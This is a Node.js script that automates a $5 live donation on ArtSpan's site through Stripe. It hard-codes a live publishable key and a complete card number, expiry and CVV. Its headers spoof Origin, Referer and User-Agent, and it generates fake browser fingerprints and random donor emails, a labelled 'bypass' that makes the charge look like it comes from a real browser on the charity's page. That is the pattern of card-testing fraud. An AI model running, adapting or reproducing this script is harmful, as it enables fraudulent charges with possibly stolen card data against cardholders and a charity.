const axios = require('axios');

// Function to generate dynamic browser fingerprints
const genFingerprint = () => 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
    const r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
});

const CONFIG = {
    PK: 'pk_live_51QVIZEBQDKIMdEl0TH6zoYwCH8E5Q1XyxJ73HNSqz7kWQUDPelsHHplSQnRUDzQGkoC2PtEqKqhgT9pkltge0jaB00C63zAYQm',
    CARD: { num: '4283322085859286', mon: '06', year: '2026', cvv: '097' }
};

async function simulateHumanDonation() {
    console.log("🧔 --- [MAN DONATING: STARTING FLOW] ---");

    try {
        // STEP 1: Get Secret (Initiating the donation form)
        const intentRes = await axios.post('https://us-central1-artspanapp.cloudfunctions.net/createPaymentIntent', {
            amount: 500, // $5.00 donation
            email: `donor${Math.floor(Math.random()*1000)}@gmail.com`,
            live: true
        });
        const secret = intentRes.data.clientSecret;
        console.log("✅ Donation Initiated");

        // STEP 2: Tokenization (The Bypass)
        // We set headers to look like we are using a real browser on the ArtSpan site
        const pmRes = await axios.post('https://api.stripe.com/v1/payment_methods', 
            new URLSearchParams({
                'type': 'card',
                'card[number]': CONFIG.CARD.num,
                'card[cvc]': CONFIG.CARD.cvv,
                'card[exp_month]': CONFIG.CARD.mon,
                'card[exp_year]': CONFIG.CARD.year,
                'key': CONFIG.PK,
                'guid': genFingerprint(),
                'muid': genFingerprint(),
                'sid': genFingerprint(),
                'payment_user_agent': 'stripe.js/83a1f53796; stripe-js-v3/83a1f53796'
            }).toString(),
            {
                headers: {
                    'Origin': 'https://js.stripe.com',
                    'Referer': 'https://www.artspan.org/', // Authorized domain
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0'
                }
            }
        ).catch(e => e.response);

        if (pmRes.data.error) {
            console.log("❌ Surface Error:", pmRes.data.error.message);
            return;
        }

        const pm_id = pmRes.data.id;
        console.log("✅ Card Handshake Success:", pm_id);

        // STEP 3: Final Confirmation
        const confirmRes = await axios.post(`https://api.stripe.com/v1/payment_intents/${secret.split('_secret')[0]}/confirm`, 
            new URLSearchParams({
                'payment_method': pm_id,
                'client_secret': secret,
                'key': CONFIG.PK
            }).toString(),
            {
                headers: {
                    'Origin': 'https://www.artspan.org',
                    'Referer': 'https://www.artspan.org/'
                }
            }
        );

        console.log("💰 DONATION RESULT:", confirmRes.data.status);

    } catch (err) {
        console.log("❌ Bank Response:", err.response ? err.response.data.error.message : err.message);
    }
}

simulateHumanDonation();
